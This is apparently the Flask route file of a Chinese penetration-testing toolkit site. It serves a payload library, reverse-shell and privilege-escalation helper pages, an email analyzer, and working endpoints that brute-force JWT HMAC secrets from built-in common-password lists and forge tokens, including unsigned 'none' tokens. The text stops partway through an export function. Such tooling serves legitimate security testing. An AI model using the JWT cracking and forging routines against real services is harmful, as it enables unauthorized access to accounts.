
from flask import Blueprint, render_template, request, jsonify, current_app, abort, send_file, Response, redirect, url_for
# 独立SaaS版：无需认证（已移除 flask_login 依赖）
import json
import os
import io
import zipfile
import base64
import hmac
import hashlib
from datetime import datetime

tools_bp = Blueprint('tools', __name__)


def jwt_encode_secret(secret, encoding):
    """根据编码格式转换密钥"""
    if encoding == 'base64':
        return base64.b64decode(secret)
    elif encoding == 'hex':
        return bytes.fromhex(secret)
    elif encoding == 'latin1':
        return secret.encode('latin-1')
    else:
        return secret.encode('utf-8')


def jwt_decode_header(token_parts):
    """解码JWT Header，返回(header_dict, algo)"""
    header_b64 = token_parts[0].replace('-', '+').replace('_', '/')
    padding = 4 - len(header_b64) % 4
    if padding != 4:
        header_b64 += '=' * padding
    header = json.loads(base64.b64decode(header_b64))
    return header, header.get('alg', 'HS256')


def jwt_decode_signature(sig_str):
    """解码JWT签名，返回bytes"""
    sig_b64 = sig_str.replace('-', '+').replace('_', '/')
    padding = 4 - len(sig_b64) % 4
    if padding != 4:
        sig_b64 += '=' * padding
    return base64.b64decode(sig_b64)


# Load data lazily or on import
PAYLOADER_DATA = {}

def load_payloader_data():
    global PAYLOADER_DATA
    if not PAYLOADER_DATA:
        try:
            data_path = os.path.join(current_app.root_path, 'data', 'payloader.json')
            with open(data_path, 'r', encoding='utf-8') as f:
                PAYLOADER_DATA = json.load(f)
        except Exception as e:
            print(f"Error loading payloader data: {e}")
            PAYLOADER_DATA = {'webPayloads': [], 'intranetPayloads': [], 'toolCommands': []}
    return PAYLOADER_DATA

@tools_bp.route('/api/payload_data')
def api_payload_data():
    data = load_payloader_data()
    return jsonify(data)

@tools_bp.route('/payloader')
def payloader_index():
    return render_template('tools/payloader_index.html', title='载荷武库')

@tools_bp.route('/cyberchef')
def cyberchef():
    return render_template('tools/cyberchef.html', title='加解密转换')

@tools_bp.route('/payloader/web')
def payloader_web():
    return redirect(url_for('tools.payloader_index'))

@tools_bp.route('/payloader/intranet')
def payloader_intranet():
    return redirect(url_for('tools.payloader_index'))

@tools_bp.route('/payloader/commands')
def payloader_commands():
    return redirect(url_for('tools.payloader_index'))

# ========== 载荷索引（首次访问构建一次，供分页/搜索/详情 O(1)） ==========
PAYLOADER_INDEX = {}


def _norm_text(obj):
    if isinstance(obj, dict):
        return obj.get('zh', obj.get('en', ''))
    return obj or ''


def get_payload_index():
    if PAYLOADER_INDEX:
        return PAYLOADER_INDEX
    data = load_payloader_data()
    for type_key, src_key in (('web', 'webPayloads'), ('intranet', 'intranetPayloads'), ('command', 'toolCommands')):
        entries, by_id = [], {}
        for p in data.get(src_key, []):
            pid = p.get('id')
            entries.append({
                'id': pid,
                'name': _norm_text(p.get('name')),
                'cat': _norm_text(p.get('category')) or '未分类',
                'desc': _norm_text(p.get('description'))[:160],
            })
            by_id[pid] = p
        PAYLOADER_INDEX[type_key] = {'entries': entries, 'by_id': by_id}
    return PAYLOADER_INDEX


@tools_bp.route('/api/payload_list')
def api_payload_list():
    """分页+搜索的载荷轻量列表（不再整包 2.7MB 下发）"""
    type_key = request.args.get('type', 'web')
    cat = request.args.get('cat', '')
    keyword = request.args.get('keyword', '').strip().lower()
    try:
        page = max(1, int(request.args.get('page', 1)))
        per = min(500, max(10, int(request.args.get('per', 200))))
    except ValueError:
        page, per = 1, 200
    idx = get_payload_index().get(type_key)
    if not idx:
        return jsonify({'error': 'invalid type'}), 400
    entries = idx['entries']
    cats = {}
    for e in entries:
        cats[e['cat']] = cats.get(e['cat'], 0) + 1
    if cat:
        entries = [e for e in entries if e['cat'] == cat]
    if keyword:
        entries = [e for e in entries if keyword in e['name'].lower()
                    or keyword in e['desc'].lower() or keyword in e['cat'].lower()]
    total = len(entries)
    items = entries[(page - 1) * per: page * per]
    return jsonify({'type': type_key, 'total': total, 'page': page, 'per': per,
                    'has_more': page * per < total,
                    'cats': [{'name': k, 'count': v} for k, v in cats.items()],
                    'items': items})


@tools_bp.route('/api/payload_item')
def api_payload_item():
    """单条载荷完整数据（详情面板按需加载）"""
    type_key = request.args.get('type', 'web')
    pid = request.args.get('id', '')
    idx = get_payload_index().get(type_key)
    item = idx['by_id'].get(pid) if idx else None
    if not item:
        return jsonify({'error': 'not found'}), 404
    return jsonify(item)


@tools_bp.route('/payloader/detail/<type>/<id>')
def payloader_detail(type, id):
    idx = get_payload_index().get(type)
    if not idx:
        abort(404)
    item = idx['by_id'].get(id)
    if not item:
        abort(404)
        
    # Helper to get localized string
    def get_text(obj):
        if isinstance(obj, dict) and ('zh' in obj or 'en' in obj):
            return obj.get('zh', obj.get('en', ''))
        return obj
        
    return render_template('tools/payloader_detail.html', item=item, type=type,
                           get_text=get_text, title=get_text(item.get('name', '载荷详情')))

# ========== 新集成的安全工具 ==========

@tools_bp.route('/assetdata-filter')
def assetdata_filter():
    """资产分拣工具"""
    return render_template('tools/assetdata_filter.html', title='资产分拣')

@tools_bp.route('/file-analysis')
def file_analysis():
    """文件特征分析（纯前端，文件不上传）"""
    return render_template('tools/file_analysis.html', title='文件特征分析')

@tools_bp.route('/http-analysis')
def http_analysis():
    """HTTP 请求/响应离线安全分析"""
    return render_template('tools/http_analysis.html', title='HTTP 安全分析')

@tools_bp.route('/file-download')
def file_download():
    """传输命令生成器"""
    return render_template('tools/file_download.html', title='传输命令生成器')

@tools_bp.route('/search-hacking')
def search_hacking():
    """信息收集语法辅助工具"""
    return render_template('tools/search_hacking_tool.html', title='信息收集语法辅助')

@tools_bp.route('/passwd')
def passwd():
    """弱口令查询工具"""
    return render_template('tools/passwd.html', title='弱口令查询')

@tools_bp.route('/passwd-tools')
def passwd_tools():
    """社工密码字典生成器"""
    return render_template('tools/passwd_tools.html', title='社工密码字典生成器')

@tools_bp.route('/process-check')
def process_check():
    """Windows系统进程识别工具"""
    return render_template('tools/process_check.html', title='进程分析')

@tools_bp.route('/reverse-shell')
def reverse_shell():
    """Shell反连"""
    return render_template('tools/reverse_shell.html', title='Shell反连')

@tools_bp.route('/windows-systeminfo')
def windows_systeminfo():
    """提权辅助工具"""
    return render_template('tools/windows_systeminfo.html', title='提权辅助')

@tools_bp.route('/jsfuck')
def jsfuck():
    """JSFuck混淆器"""
    return render_template('tools/jsfuck.html', title='JSFuck混淆器')

@tools_bp.route('/jwt-tool')
def jwt_tool():
    """JWT安全工具"""
    return render_template('tools/jwt_tool.html', title='JWT安全工具')

@tools_bp.route('/jwt-generate', methods=['POST'])
def jwt_generate():
    """JWT生成API - 支持所有标准JWT算法"""
    try:
        data = request.get_json(silent=True) or {}
        header = data.get('header', {})
        payload = data.get('payload', {})
        secret = data.get('secret', '')

        algo = header.get('alg', 'HS256')

        # Base64URL编码
        def b64url_encode(data):
            if isinstance(data, dict):
                data = json.dumps(data, separators=(',', ':'))
            return base64.urlsafe_b64encode(data.encode('utf-8')).decode('utf-8').rstrip('=')

        header_b64 = b64url_encode(header)
        payload_b64 = b64url_encode(payload)
        message = header_b64 + '.' + payload_b64

        if algo == 'none':
            token = message + '.'
        elif algo.startswith('HS'):
            # HMAC系列: HS256, HS384, HS512
            hash_map = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384, 'HS512': hashlib.sha512}
            hash_func = hash_map.get(algo)
            if not hash_func:
                return jsonify({'success': False, 'error': f'不支持的算法: {algo}'})
            signature = hmac.new(secret.encode('utf-8'), message.encode('utf-8'), hash_func).digest()
            sig_b64 = base64.urlsafe_b64encode(signature).decode('utf-8').rstrip('=')
            token = message + '.' + sig_b64
        elif algo.startswith('RS') or algo.startswith('PS'):
            # RSA系列: RS256, RS384, RS512, PS256, PS384, PS512
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.hazmat.primitives.asymmetric import rsa, padding
            # secret字段传入PEM格式私钥
            if secret.strip().startswith('-----BEGIN'):
                private_key = serialization.load_pem_private_key(secret.encode('utf-8'), password=None)
            else:
                # 如果不是PEM，生成一个临时RSA密钥对用于演示
                private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

            hash_map = {'RS256': hashes.SHA256, 'RS384': hashes.SHA384, 'RS512': hashes.SHA512,
                        'PS256': hashes.SHA256, 'PS384': hashes.SHA384, 'PS512': hashes.SHA512}
            hash_alg = hash_map.get(algo, hashes.SHA256)()

            if algo.startswith('PS'):
                sig = private_key.sign(message.encode('utf-8'), padding.PSS(mgf=padding.MGF1(hash_alg), salt_length=padding.PSS.MAX_LENGTH), hash_alg)
            else:
                sig = private_key.sign(message.encode('utf-8'), padding.PKCS1v15(), hash_alg)
            sig_b64 = base64.urlsafe_b64encode(sig).decode('utf-8').rstrip('=')
            token = message + '.' + sig_b64
        elif algo.startswith('ES'):
            # ECDSA系列: ES256, ES384, ES512
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.hazmat.primitives.asymmetric import ec
            curve_map = {'ES256': ec.SECP256R1(), 'ES384': ec.SECP384R1(), 'ES512': ec.SECP521R1()}
            curve = curve_map.get(algo)
            if not curve:
                return jsonify({'success': False, 'error': f'不支持的算法: {algo}'})

            if secret.strip().startswith('-----BEGIN'):
                private_key = serialization.load_pem_private_key(secret.encode('utf-8'), password=None)
            else:
                private_key = ec.generate_private_key(curve)

            hash_map = {'ES256': hashes.SHA256, 'ES384': hashes.SHA384, 'ES512': hashes.SHA512}
            sig = private_key.sign(message.encode('utf-8'), ec.ECDSA(hash_map[algo]()))
            from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature
            r, s = decode_dss_signature(sig)
            byte_len = (curve.key_size + 7) // 8
            sig = r.to_bytes(byte_len, 'big') + s.to_bytes(byte_len, 'big')
            sig_b64 = base64.urlsafe_b64encode(sig).decode('utf-8').rstrip('=')
            token = message + '.' + sig_b64
        elif algo in ('Ed25519', 'Ed448'):
            # EdDSA系列: Ed25519, Ed448
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.hazmat.primitives.asymmetric import ed25519, ed448

            if secret.strip().startswith('-----BEGIN'):
                private_key = serialization.load_pem_private_key(secret.encode('utf-8'), password=None)
            else:
                if algo == 'Ed25519':
                    private_key = ed25519.Ed25519PrivateKey.generate()
                else:
                    private_key = ed448.Ed448PrivateKey.generate()

            sig = private_key.sign(message.encode('utf-8'))
            sig_b64 = base64.urlsafe_b64encode(sig).decode('utf-8').rstrip('=')
            token = message + '.' + sig_b64
        else:
            return jsonify({'success': False, 'error': f'不支持的算法: {algo}'})

        return jsonify({'success': True, 'token': token})

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@tools_bp.route('/jwt-crack', methods=['POST'])
def jwt_crack():
    """JWT密钥破解API"""
    try:
        data = request.get_json(silent=True) or {}
        token = data.get('token', '')
        dict_type = data.get('dict_type', 'common')
        custom_dict = data.get('custom_dict', [])
        encoding = data.get('encoding', 'utf8')

        if not token:
            return jsonify({'success': False, 'error': '缺少token'})

        parts = token.split('.')
        if len(parts) != 3:
            return jsonify({'success': False, 'error': '无效的JWT格式'})

        header, algo = jwt_decode_header(parts)

        algo_map = {
            'HS256': hashlib.sha256,
            'HS384': hashlib.sha384,
            'HS512': hashlib.sha512
        }

        if algo not in algo_map:
            return jsonify({'success': False, 'error': f'算法 {algo} 不支持暴力破解，仅支持HMAC系列(HS256/HS384/HS512)'}), 400

        hash_func = algo_map[algo]
        message = parts[0] + '.' + parts[1]
        target_sig = jwt_decode_signature(parts[2])

        # 加载字典
        dictionaries = {
            'common': [
                'secret', 'password', '123456', 'admin', 'key', 'jwt', 'token', 'pass', 'root', 'test',
                'qwerty', 'abc123', 'letmein', 'monkey', 'master', 'dragon', '111111', 'baseball',
                'iloveyou', 'trustno1', 'sunshine', 'princess', 'welcome', 'shadow', 'superman',
                'michael', 'football', 'hunter', 'buster', 'soccer', 'harley', 'batman', 'andrew',
                'tigger', 'charlie', 'robert', 'thomas', 'hockey', 'ranger', 'daniel', 'starwars',
                'klaster', 'george', 'computer', 'michelle', 'jessica', 'pepper', 'zxcvbn', 'asdfgh',
                '1q2w3e', '1q2w3e4r', 'qwer1234', 'asdf1234', 'zxcv1234', 'qazwsx', 'edcrfv',
                'password1', 'password123', 'admin123', 'root123', 'user123', 'test123', 'guest',
                'guest123', 'login', 'login123', 'pass123', 'changeme', 'default', 'system',
                'server', 'database', 'db123', 'app123', 'web123', 'ftp123', 'mail123', 'ssh123'
            ],
            'top100': [
                '123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111',
                '1234567', 'dragon', '123123', 'baseball', 'abc123', 'football', 'monkey', 'letmein',
                '696969', 'shadow', 'master', '666666', 'qwertyuiop', '123321', 'mustang', '1234567890',
                'michael', '654321', 'pussy', 'superman', '1qaz2wsx', '7777777', 'fuckyou', '121212',
                '000000', 'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan', 'jennifer', 'zxcvbnm',
                'asdfgh', 'hunter', 'buster', 'soccer', 'harley', 'batman', 'andrew', 'tigger', 'sunshine',
                'iloveyou', 'fuckme', '2000', 'charlie', 'robert', 'thomas', 'hockey', 'ranger', 'daniel',
                'starwars', 'klaster', '112233', 'george', 'asshole', 'computer', 'michelle', 'jessica',
                'pepper', '1111', 'zxcvbn', '555555', '11111111', '131313', 'freedom', '777777', 'pass',
                'fuck', 'maggie', '159753', 'aaaaaa', 'ginger', 'princess', 'joshua', 'cheese', 'amanda',
                'summer', 'love', 'ashley', '6969', 'nicole', 'chelsea', 'biteme', 'matthew', 'access',
                'yankees', '987654321', 'dallas', 'austin', 'thunder', 'taylor', 'matrix'
            ]
        }

        if dict_type == 'custom':
            dict_list = [s.strip() for s in custom_dict if s.strip()]
        else:
            dict_list = dictionaries.get(dict_type, dictionaries['common'])

        # 限制字典大小防止服务器过载
        max_dict_size = 10000
        if len(dict_list) > max_dict_size:
            dict_list = dict_list[:max_dict_size]

        # 破解
        found = False
        found_secret = None
        tried = 0

        for secret in dict_list:
            tried += 1
            try:
                secret_bytes = jwt_encode_secret(secret, encoding)
                computed_sig = hmac.new(
                    secret_bytes,
                    message.encode('utf-8'),
                    hash_func
                ).digest()

                if computed_sig == target_sig:
                    found = True
                    found_secret = secret
                    break
            except:
                continue

        return jsonify({
            'success': True,
            'found': found,
            'secret': found_secret,
            'tried': tried,
            'total': len(dict_list)
        })

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@tools_bp.route('/jwt-crack-file', methods=['POST'])
def jwt_crack_file():
    """JWT密钥破解 - 文件上传方式"""
    try:
        token = request.form.get('token', '')
        dict_file = request.files.get('dict_file')
        encoding = request.form.get('encoding', 'utf8')

        if not token:
            return jsonify({'success': False, 'error': '缺少token'})

        if not dict_file:
            return jsonify({'success': False, 'error': '缺少字典文件'})

        # 限制文件大小 (5MB)
        dict_file.seek(0, 2)
        file_size = dict_file.tell()
        dict_file.seek(0)

        if file_size > 5 * 1024 * 1024:  # 5MB
            return jsonify({'success': False, 'error': '文件过大，最大支持5MB'})

        parts = token.split('.')
        if len(parts) != 3:
            return jsonify({'success': False, 'error': '无效的JWT格式'})

        header, algo = jwt_decode_header(parts)

        algo_map = {
            'HS256': hashlib.sha256,
            'HS384': hashlib.sha384,
            'HS512': hashlib.sha512
        }

        if algo not in algo_map:
            return jsonify({'success': False, 'error': f'算法 {algo} 不支持暴力破解，仅支持HMAC系列(HS256/HS384/HS512)'}), 400

        hash_func = algo_map[algo]
        message = parts[0] + '.' + parts[1]
        target_sig = jwt_decode_signature(parts[2])

        # 从文件读取字典，逐行处理
        found = False
        found_secret = None
        tried = 0
        max_tries = 500000  # 最大尝试次数

        content = dict_file.read().decode('utf-8', errors='ignore')

        for line in content.splitlines():
            if tried >= max_tries:
                break

            secret = line.strip()
            if not secret:
                continue

            tried += 1

            try:
                secret_bytes = jwt_encode_secret(secret, encoding)
                computed_sig = hmac.new(
                    secret_bytes,
                    message.encode('utf-8'),
                    hash_func
                ).digest()

                if computed_sig == target_sig:
                    found = True
                    found_secret = secret
                    break
            except:
                continue

        return jsonify({
            'success': True,
            'found': found,
            'secret': found_secret,
            'tried': tried
        })

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@tools_bp.route('/email-analyze')
def email_analyze():
    """邮件分析工具"""
    return render_template('tools/email_analyzer.html', title='邮件分析工具')

@tools_bp.route('/email-analyze/api', methods=['POST'])
def email_analyze_api():
    """Email解析API"""
    import re
    import base64
    from email import policy
    from email.parser import BytesParser
    from email.utils import parseaddr, parsedate_to_datetime
    from email.header import decode_header
    import html as html_module
    import io

    try:
        data = request.get_json(silent=True) or {}
        content = data.get('content', '')

        if not content:
            return jsonify({'success': False, 'error': '无内容'})

        # 安全检查：限制文件大小 (约5MB)
        if len(content) > 5 * 1024 * 1024:
            return jsonify({'success': False, 'error': '文件过大，最大支持5MB'})

        # 解析邮件
        if isinstance(content, str):
            content = content.encode('utf-8', errors='replace')

        parser = BytesParser(policy=policy.default)
        msg = parser.parsebytes(content)

        result = {
            'success': True,
            'raw_content': content.decode('utf-8', errors='replace')[:50000],
            'raw_size': len(content)
        }

        # 解码邮件头
        def decode_header_value(value):
            if not value:
                return ''
            try:
                decoded_parts = decode_header(value)
                result_str = ''
                for part, charset in decoded_parts:
                    if isinstance(part, bytes):
                        result_str += part.decode(charset or 'utf-8', errors='replace')
                    else:
                        result_str += str(part)
                return result_str
            except:
                return str(value)

        # 基本信息
        result['subject'] = decode_header_value(msg.get('Subject', ''))
        result['date'] = msg.get('Date', '')
        result['message_id'] = msg.get('Message-ID', '')

        # 发件人
        from_header = msg.get('From', '')
        if from_header:
            name, email = parseaddr(decode_header_value(from_header))
            result['from'] = {'name': name, 'email': email} if name else email

        # 收件人
        result['to'] = []
        to_header = msg.get('To', '')
        if to_header:
            for addr in to_header.split(','):
                name, email = parseaddr(decode_header_value(addr.strip()))
                result['to'].append({'name': name, 'email': email} if name else email)

        # 抄送
        result['cc'] = []
        cc_header = msg.get('Cc', '')
        if cc_header:
            for addr in cc_header.split(','):
                name, email = parseaddr(decode_header_value(addr.strip()))
                result['cc'].append({'name': name, 'email': email} if name else email)

        # 邮件正文
        result['text_body'] = ''
        result['html_body'] = ''

        def get_body_from_part(part):
            """递归获取邮件正文"""
            text_body = ''
            html_body = ''

            if part.is_multipart():
                for subpart in part.iter_parts():
                    t, h = get_body_from_part(subpart)
                    if t and not text_body:
                        text_body = t
                    if h and not html_body:
                        html_body = h
            else:
                content_type = part.get_content_type()
                charset = part.get_content_charset() or 'utf-8'

                try:
                    payload = part.get_payload(decode=True)
                    if payload:
                        body = payload.decode(charset, errors='replace')

                        if content_type == 'text/plain' and not text_body:
                            text_body = body
                        elif content_type == 'text/html' and not html_body:
                            html_body = body
                except Exception as e:
                    pass

            return text_body, html_body

        result['text_body'], result['html_body'] = get_body_from_part(msg)

        # 提取链接
        result['links'] = []
        link_pattern = re.compile(r'https?://[^\s<>"\'\)\]\}]+', re.IGNORECASE)
        all_text = result['text_body'] + ' ' + result['html_body']
        found_links = set(link_pattern.findall(all_text))

        # 链接分类
        for link in found_links:
            link_type = 'link'
            if any(x in link.lower() for x in ['.exe', '.dll', '.bat', '.cmd', '.ps1', '.vbs', '.js']):
                link_type = 'executable'
            elif any(x in link.lower() for x in ['.zip', '.rar', '.7z', '.tar', '.gz']):
                link_type = 'archive'
            elif any(x in link.lower() for x in ['login', 'signin', 'auth', 'account', 'password', 'verify']):
                link_type = 'phishing-suspect'

            # 安全处理：不直接包含敏感参数
            safe_link = link.split('?')[0] if '?' in link else link
            result['links'].append({
                'url': safe_link,
                'type': link_type
            })

        # 提取附件
        result['attachments'] = []

        def extract_attachments(part):
            if part.is_multipart():
                for subpart in part.iter_parts():
                    extract_attachments(subpart)
            else:
                filename = part.get_filename()
                if filename:
                    filename = decode_header_value(filename)
                    content_type = part.get_content_type()
                    payload = part.get_payload(decode=True)

                    if payload:
                        # 安全检查：限制单个附件大小
                        if len(payload) > 10 * 1024 * 1024:  # 10MB
                            return

                        # 检查危险文件类型
                        dangerous_extensions = ['.exe', '.dll', '.bat', '.cmd', '.ps1', '.vbs', '.js', '.jar', '.scr', '.pif', '.com']
                        is_dangerous = any(filename.lower().endswith(ext) for ext in dangerous_extensions)

                        result['attachments'].append({
                            'filename': filename,
                            'content_type': content_type,
                            'size': len(payload),
                            'data': base64.b64encode(payload).decode('ascii'),
                            'is_dangerous': is_dangerous
                        })

        extract_attachments(msg)

        # 提取域名和IP
        result['domains'] = []
        result['ips'] = []

        domain_pattern = re.compile(r'\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}\b')
        ip_pattern = re.compile(r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b')

        # 从链接和邮件头中提取
        header_text = str(msg.items())
        all_content = all_text + ' ' + header_text

        domains = set(domain_pattern.findall(all_content))
        ips = set(ip_pattern.findall(all_content))

        # 过滤私有IP和本地IP
        def is_private_ip(ip):
            parts = ip.split('.')
            if len(parts) != 4:
                return False
            first = int(parts[0])
            second = int(parts[1])
            # 10.x.x.x, 172.16-31.x.x, 192.168.x.x, 127.x.x.x
            if first == 10 or first == 127:
                return True
            if first == 172 and 16 <= second <= 31:
                return True
            if first == 192 and second == 168:
                return True
            return False

        result['ips'] = [ip for ip in ips if not is_private_ip(ip)]

        # 过滤常见无害域名
        common_domains = ['w3.org', 'w3c.org', 'ietf.org', 'mime.org']
        result['domains'] = [d for d in domains if not any(cd in d.lower() for cd in common_domains)]

        return jsonify(result)

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@tools_bp.route('/email-analyze/export', methods=['POST'])
def email_analyze_export():
    """导出邮件分析报告"""
    try:
        data = request.form.get('data', '{}')
        analysis_data = json.loads(data)
        export_format = request.form.get('format', 'html')
        include_attachments = request.form.get('include_attachments') == '1'

        # 生成文件名
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        subject = analysis_data.get('subject', 'email')[:30].replace('/', '_').replace('\\', '_')
        base_filename = f"email_analysis_{timestamp}"

        if export_format == 'excel':
            return export_excel(analysis_data, base_filename)
        elif export_format == 'word':
            return export_word(analysis_data, base_filename)
        elif export_format == 'markdown':
            return export_markdown(analysis_data, base_filename)
        elif export_format == 'html':
            return export_html_report(analysis_data, base_filename)
        elif export_format == 'pdf':
            return export_pdf(analysis_data, base_filename)
        elif export_format == 'all':
            return export_all(analysis_data, base_filename, include_attachments)
        else:
            return jsonify({'success': False, 'error': '未知格式'})

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

def export_excel(data, filename):
    """导出Excel格式"""
    try:
        import openpyxl
        from openpyxl.styles import Font, PatternFill, Alignment

        wb = openpyxl.Workbook()
        ws = wb.active
        ws.title = "邮件分析报告"

        # 标题样式
        header_fill = PatternFill(start_color="0077CC", end_color="0077CC", fill_type="solid")
        header_font = Font(color="FFFFFF", bold=True)

        # 基本信息
        ws['A1'] = "邮件分析报告"
        ws['A1'].font = Font(size=16, bold=True)
        ws.merge_cells('A1:D1')

        headers = ['项目', '内容']
        ws.append([])
        ws.append(headers)
        for cell in ws[3]:
            if cell.value:
                cell.fill = header_fill
                cell.font = header_font

        info_items = [
            ('主题', data.get('subject', '')),
            ('日期', data.get('date', '')),
            ('发件人', format_address_for_export(data.get('from'))),
            ('收件人', ', '.join([format_address_for_export(a) for a in data.get('to', [])])),
            ('抄送', ', '.join([format_address_for_export(a) for a in data.get('cc', [])])),
            ('Message-ID', data.get('message_id', '')),
            ('邮件大小', str(data.get('raw_size', 0)) + ' bytes'),
        ]

        for item in info_items:
            ws.append(item)

        # 链接
        if data.get('links'):
            ws.append([])
            ws.append(['链接列表'])
            ws['A' + str(ws.max_row)].font = Font(bold=True)
            ws.append(['URL', '类型'])
            for cell in ws[ws.max_row]:
                if cell.value:
                    cell.fill = header_fill
                    cell.font = header_font
            for link in data.get('links', []):
                ws.append([link.get('url', ''), link.get('type', '')])

        # 附件
        if data.get('attachments'):
            ws.append([])
            ws.append(['附件列表'])
            ws['A' + str(ws.max_row)].font = Font(bold=True)
            ws.append(['文件名', '大小', '类型', '危险'])
            for cell in ws[ws.max_row]:
                if cell.value:
                    cell.fill = header_fill
                    cell.font = header_font
            for att in data.get('attachments', []):
                ws.append([
                    att.get('filename', ''),
                    str(att.get('size', 0)),
                    att.get('content_type', ''),
                    '是' if att.get('is_dangerous') else '否'
                ])

        # 调整列宽
        ws.column_dimensions['A'].width = 30
        ws.column_dimensions['B'].width = 60
        ws.column_dimensions['C'].width = 20
        ws.column_dimensions['D'].width = 10

        output = io.BytesIO()
        wb.save(output)
        output.seek(0)

        return send_file(
            output,
            mimetype='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
            as_attachment=True,
            download_name=f'{filename}.xlsx'
        )
    except ImportError:
        return "需要安装 openpyxl: pip install openpyxl", 500
    except Exception as e:
        return f"Excel导出错误: {str(e)}", 500

def export_word(data, filename):
    """导出Word格式"""
    try:
        from docx import Document
        from docx.shared import Inches, Pt

        doc = Document()
        doc.add_heading('邮件分析报告', 0)

        doc.add_heading('基本信息', level=1)

        info_table = doc.add_table(rows=6, cols=2)
        info_table.style = 'Table Grid'

        info_items = [
            ('主题', data.get('subject', '')),
            ('日期', data.get('date', '')),
            ('发件人', format_address_for_export(data.get('from'))),
            ('收件人', ', '.join([format_address_for_export(a) for a in data.get('to', [])])),
            ('抄送', ', '.join([format_address_for_export(a) for a in data.get('cc', [])])),
            ('Message-ID', data.get('message_id', '')),
        ]

        for i, (label, value) in enumerate(info_items):
            info_table.rows[i].cells[0].text = label
            info_table.rows[i].cells[1].text = str(value) if value else '(无)'

        # 链接
        if data.get('links'):
            doc.add_heading('链接列表', level=1)
            for link in data.get('links', []):
                p = doc.add_paragraph()
                p.add_run(link.get('url', '')).underline = True
                p.add_run(f" [{link.get('type', 'link')}]")

        # 附件
        if data.get('attachments'):
            doc.add_heading('附件列表', level=1)
            att_table = doc.add_table(rows=len(data['attachments']) + 1, cols=4)
            att_table.style = 'Table Grid'
            headers = ['文件名', '大小', '类型', '危险']
            for i, h in enumerate(headers):
                att_table.rows[0].cells[i].text = h

            for i, att in enumerate(data.get('attachments', []), 1):
                att_table.rows[i].cells[0].text = att.get('filename', '')
                att_table.rows[i].cells[1].text = str(att.get('size', 0))
                att_table.rows[i].cells[2].text = att.get('content_type', '')
                att_table.rows[i].cells[3].text = '是' if att.get('is_dangerous') else '否'

        output = io.BytesIO()
        doc.save(output)
        output.seek(0)

        return send_file(
            output,
            mimetype='application/vnd.openxmlformats-officedocument.wordprocessingml.document',
            as_attachment=True,
            download_name=f'{filename}.docx'
        )
    except ImportError:
        return "需要安装 python-docx: pip install python-docx", 500
    except Exception as e:
        return f"Word导出错误: {str(e)}", 500

def export_markdown(data, filename):
    """导出Markdown格式"""
    md = "# 邮件分析报告\n\n"
    md += f"生成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"

    md += "## 基本信息\n\n"
    md += "| 项目 | 内容 |\n"
    md += "|------|------|\n"
    md += f"| 主题 | {data.get('subject', '')} |\n"
    md += f"| 日期 | {data.get('date', '')} |\n"
    md += f"| 发件人 | {format_address_for_export(data.get('from'))} |\n"
    md += f"| 收件人 | {', '.join([format_address_for_export(a) for a in data.get('to', [])])} |\n"
    md += f"| Message-ID | {data.get('message_id', '')} |\n\n"

    if data.get('links'):
        md += "## 链接列表\n\n"
        for link in data.get('links', []):
            md += f"- [{link.get('url', '')}]({link.get('url', '')}) `{link.get('type', 'link')}`\n"
        md += "\n"

    if data.get('attachments'):
        md += "## 附件列表\n\n"
        md += "| 文件名 | 大小 | 类型 |\n"
        md += "|--------|------|------|\n"
        for att in data.get('attachments', []):
            md += f"| {att.get('filename', '')} | {att.get('size', 0)} | {att.get('content_type', '')} |\n"

    if data.get('text_body'):
        md += "\n## 邮件正文\n\n```\n" + data.get('text_body', '') + "\n```\n"

    return Response(
        md,
        mimetype='text/markdown',
        headers={'Content-Disposition': f'attachment; filename={filename}.md'}
    )

def export_html_report(data, filename):
    """导出HTML格式"""
    html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>邮件分析报告</title>
    <style>
        body {{ font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }}
        h1, h2 {{ color: #0077cc; }}
        table {{ border-collapse: collapse; width: 100%; margin: 10px 0; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background: #0077cc; color: white; }}
        .danger {{ color: #dc3545; }}
        pre {{ background: #f5f5f5; padding: 15px; overflow-x: auto; white-space: pre-wrap; }}
        a {{ color: #0077cc; }}
    </style>
</head>
<body>
    <h1>邮件分析报告</h1>
    <p>生成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>

    <h2>基本信息</h2>
    <table>
        <tr><th>项目</th><th>内容</th></tr>
        <tr><td>主题</td><td>{escape_html_export(data.get('subject', ''))}</td></tr>
        <tr><td>日期</td><td>{escape_html_export(data.get('date', ''))}</td></tr>
        <tr><td>发件人</td><td>{escape_html_export(format_address_for_export(data.get('from')))}</td></tr>
        <tr><td>收件人</td><td>{escape_html_export(', '.join([format_address_for_export(a) for a in data.get('to', [])]))}</td></tr>
        <tr><td>Message-ID</td><td>{escape_html_export(data.get('message_id', ''))}</td></tr>
    </table>
"""

    if data.get('links'):
        html += "<h2>链接列表</h2><table><tr><th>URL</th><th>类型</th></tr>"
        for link in data.get('links', []):
            html += f"<tr><td><a href='{escape_html_export(link.get('url', ''))}' target='_blank'>{escape_html_export(link.get('url', ''))}</a></td><td>{escape_html_export(link.get('type', ''))}</td></tr>"
        html += "</table>"

    if data.get('attachments'):
